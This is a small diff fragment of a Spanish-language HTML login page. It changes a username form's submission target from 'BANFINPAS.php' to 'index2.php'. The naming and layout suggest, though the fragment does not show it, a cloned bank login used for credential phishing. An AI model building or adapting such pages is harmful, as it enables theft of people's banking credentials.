@@ -501,7 +501,7 @@ fill="#0b6b3a"/>
 
 <div class="input-label">Ingrese su Usuario</div>
 
-<form action="BANFINPAS.php" method="POST">
+<form action="index2.php" method="POST">
 
 <input type="text" name="usuario" id="usuario" placeholder="Usuario">
 
